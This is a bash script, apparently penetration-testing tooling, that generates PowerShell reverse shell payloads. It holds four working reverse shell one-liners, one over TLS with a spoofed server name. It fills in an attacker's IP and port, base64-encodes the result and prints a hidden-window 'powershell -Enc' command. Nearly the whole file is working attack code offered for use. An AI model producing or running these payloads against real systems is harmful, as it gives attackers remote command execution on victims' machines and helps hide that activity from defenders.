#!/usr/bin/env -S bash

:<<!
auth: @cyhfvg https://github.com/cyhfvg
date: 2023/04/27

ref: https://www.revshells.com/

generate a powershell reverse shell payload.
!

set -euo pipefail

SCRIPT_NAME=$(realpath $0)

cd ${SCRIPT_NAME%/*}


REV1=$(cat << '_EOF_'
$client = New-Object System.Net.Sockets.TCPClient("<TARGET_IP>",<TARGET_PORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
_EOF_
)

REV2=$(cat << '_EOF_'
$client = New-Object System.Net.Sockets.TCPClient('<TARGET_IP>',<TARGET_PORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
_EOF_
)

REV3=$(cat << '_EOF_'
$TCPClient = New-Object Net.Sockets.TCPClient('<TARGET_IP>', <TARGET_PORT>);$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()}WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()"
_EOF_
)

# TLS
REV4=$(cat << '_EOF_'
$TCPClient = New-Object Net.Sockets.TCPClient('<TARGET_IP>', <TARGET_PORT>);$NetworkStream = $TCPClient.GetStream();$SslStream = New-Object Net.Security.SslStream($NetworkStream,$false,({$true} -as [Net.Security.RemoteCertificateValidationCallback]));$SslStream.AuthenticateAsClient('cloudflare-dns.com',$null,$false);if(!$SslStream.IsEncrypted -or !$SslStream.IsSigned) {$SslStream.Close();exit}$StreamWriter = New-Object IO.StreamWriter($SslStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()};WriteToStream '';while(($BytesRead = $SslStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()
_EOF_
)

# rev_ip, rev_port {{{1
if [ $# -lt 2 ];
then
    echo "Usage: $0 <rev_ip> <rev_port> [1|2|3|4]"
    exit 0
fi

if echo "$1" | grep -q -ivP "^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$" ;
then
    echo "<rev_ip>: $1 error"
    exit 1
elif echo "$2" | grep -q -ivP "^\d{1,5}$" ;
then
    echo "<rev_port>: $2 error"
    exit 1
fi

TARGET_IP="$1"
TARGET_PORT="$2"
# }}}

# revshell type, default 1 {{{1
rev="${REV1}"
if [ $# -ge 3 ];
then
    if [ $3 -eq 1 ]; then
        rev="${REV1}"
    elif [ $3 -eq 2 ]; then
        rev="${REV2}"
    elif [ $3 -eq 3 ]; then
        rev="${REV3}"
    elif [ $3 -eq 4 ]; then
        rev="${REV4}"
    else
        echo "reverse shell type $3 error."
        exit 0
    fi
fi
# }}}


base64payload=$(echo -n "${rev}" \
    | sed -e "s#<TARGET_IP>#${TARGET_IP}#g; s#<TARGET_PORT>#${TARGET_PORT}#g" \
    | iconv -fUTF-8 -tUTF-16LE \
    | base64 -w0)

#printf "powershell -exec bypass -Enc %s\n" "${base64payload}"
#printf "powershell -nop -w hidden -exec bypass -Enc %s\n" "${base64payload}"
printf "powershell -nop -w hidden -Enc %s\n" "${base64payload}"
